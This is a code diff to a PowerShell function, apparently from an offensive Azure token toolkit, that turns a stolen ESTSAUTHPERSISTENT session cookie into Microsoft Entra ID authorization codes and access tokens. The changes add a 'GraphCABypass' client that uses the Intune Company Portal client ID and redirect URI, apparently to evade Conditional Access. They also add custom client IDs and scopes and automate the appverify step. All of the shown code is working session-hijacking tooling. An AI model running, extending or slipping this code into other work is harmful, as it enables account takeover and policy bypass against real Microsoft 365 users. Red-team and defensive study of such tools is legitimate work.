@@ -276,17 +276,22 @@ function Get-AzureTokenFromESTSCookie {
         $ESTSAuthCookie,
         [Parameter(Mandatory = $False)]
         [String[]]
-        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell")]
+        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "GraphCABypass", "Custom")]
         $Client = "MSTeams",
-        [Parameter(Mandatory = $False)]
-        [String]
-        $Resource = "https://graph.microsoft.com/",
         [Parameter(Mandatory = $False)]
         [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
         [String]$Device,
         [Parameter(Mandatory = $False)]
         [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
-        [String]$Browser
+        [String]$Browser,
+        [Parameter(Mandatory = $False)]
+        [String]$ClientID,
+        [Parameter(Mandatory = $False)]
+        [String]$Resource = "https://graph.microsoft.com",
+        [Parameter(Mandatory = $False)]
+        [String]$Scope = "openid offline_access",
+        [Parameter(Mandatory = $False)]
+        [String]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient"
     )
 
     if ($Device) {
@@ -303,34 +308,77 @@ function Get-AzureTokenFromESTSCookie {
         }
     }
 
-
     if ($Client -eq "MSTeams") {
-        $client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
     } elseif ($Client -eq "MSEdge") {
-        $client_id = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
+        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
     } elseif ($Client -eq "AzurePowershell") {
-        $client_id = "1950a258-227b-4e31-a9cf-717495945fc2"
+        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
+    } elseif ($Client -eq "GraphCABypass") {
+        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
+        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
+    } elseif ($Client -eq "Custom") {
+        if ([string]::IsNullOrWhiteSpace($ClientID)) {
+            Write-Error "ClientID must be provided for Custom client"
+            return
+        }
+        if ([string]::IsNullOrWhiteSpace($Scope)) {
+            Write-Error "Scope must be provided for Custom client"
+            return
+        }
     }
+    Write-Warning "This function currently only supports the v1 endpoint and may not work for all applications."
+    Write-Verbose "ClientID: $ClientID"
+    Write-Verbose "Resource: $Resource"
+    Write-Verbose "Scope: $Scope"
+    Write-Verbose "RedirectUrl: $RedirectUrl"
 
     $Headers = @{}
     $Headers["User-Agent"] = $UserAgent
 
     $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
-    $cookie = [System.Net.Cookie]::new("ESTSAuthPERSISTENT", "$($ESTSAuthCookie)")
+    $session.UserAgent = $UserAgent
+    # Add basic cookies to the session
+    $null = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/error"
+    $cookie = [System.Net.Cookie]::new("ESTSAUTHPERSISTENT", $ESTSAuthCookie)
     $session.Cookies.Add('https://login.microsoftonline.com/', $cookie)
+    $SessionCookies = $session.Cookies.GetCookies('https://login.microsoftonline.com') | Select-Object -ExpandProperty Name
+    Write-Verbose "Session cookies: $( $SessionCookies -join ', ' )"
 
     $state = [System.Guid]::NewGuid().ToString()
-    $redirect_uri = ([System.Uri]::EscapeDataString("https://login.microsoftonline.com/common/oauth2/nativeclient"))
+    $redirect_uri = ([System.Uri]::EscapeDataString($RedirectUrl))
 
     # Get the authorization code from the STS
+    $Uri = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($ClientID)&resource=$($Resource)&scope=$($Scope)&redirect_uri=$($redirect_uri)&state=$($state)"
+    Write-Verbose "Requesting URL: $Uri"
+    Write-Output "Calling authorization endpoint with ESTSAUTHPERSISTENT"
     if ($PSVersionTable.PSEdition -ne "Core") {
-        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)" -Headers $Headers
+        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
     } else {
-        $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)" -Headers $Headers
+        $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
+    }
+
+    if ( $sts_response.RawContent -match "\`$Config=(.*);" ) {
+        $AppConfig = $Matches[1] | ConvertFrom-Json
+        Write-Output "appverify step required for $($AppConfig.sAppName). Calling appverify endpoint"
+        $Uri = "https://login.microsoftonline.com/appverify"
+        $Body = @{
+            "ContinueAuth"    = "true"
+            "i19"             = "$(Get-Random -Minimum 1000 -Maximum 9999)"
+            "canary"          = $AppConfig.canary
+            "iscsrfspeedbump" = "false"
+            "flowToken"       = $AppConfig.sFT
+            "hpgrequestid"    = $sts_response.Headers['x-ms-request-id']
+            "ctx"             = $AppConfig.sCtx
+        }
+        if ($PSVersionTable.PSEdition -ne "Core") {
+            $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
+        } else {
+            $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers
+        }
     }
 
     if ($sts_response.StatusCode -eq 302) {
-
         if ($PSVersionTable.PSEdition -ne "Core") {
             $uri = [System.Uri]$sts_response.Headers.Location
         } else {
@@ -350,30 +398,30 @@ function Get-AzureTokenFromESTSCookie {
         }
         # When code is present, we have a valid refresh token and can use it to request a new token
         if ($queryParams.ContainsKey('code')) {
-            $refreshToken = $queryParams['code']
+            $AuthorizationCode = $queryParams['code']
+            Write-Verbose "Authorization Code: $($AuthorizationCode[0..10] -join '' )..."
         } else {
-            Write-Host "[-] Code not found in redirected URL path"
-            Write-Host "    Requested URL: https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)"
-            Write-Host "    Response Code: $($sts_response.StatusCode)"
-            Write-Host "    Response URI:  $($sts_response.Headers.Location)"
+            Write-Output "[-] Code not found in redirected URL path"
+            Write-Output "    Requested URL: $($Uri)"
+            Write-Output "    Response Code: $($sts_response.StatusCode)"
+            Write-Output "    Response URI:  $($sts_response.Headers.Location)"
             return
         }
     } else {
-        Write-Host "[-] Expected 302 redirect but received other status"
-        Write-Host "    Requested URL: https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($client_id)&resource=$($Resource)&redirect_uri=$($redirect_uri)&state=$($state)"
-        Write-Host "    Response Code: $($sts_response.StatusCode)"
-        Write-Host "[-] The request may require user interation to complete, or the provided cookie is invalid"
+        Write-Output "[-] Expected 302 redirect but received other status"
+        Write-Output "    Requested URL: $($Uri)"
+        Write-Output "    Response Code: $($sts_response.StatusCode)"
+        Write-Output "[-] The request may require user interation to complete, or the provided cookie is invalid"
         return
     }
 
-    if ($refreshToken) {
-
+    if ($AuthorizationCode) {
         $body = @{
             "resource"     = $Resource
-            "client_id"    = $client_id
+            "client_id"    = $ClientID
             "grant_type"   = "authorization_code"
-            "redirect_uri" = "https://login.microsoftonline.com/common/oauth2/nativeclient"
-            "code"         = $refreshToken
+            "redirect_uri" = $RedirectUrl
+            "code"         = $AuthorizationCode
             "scope"        = "openid"
         }
 
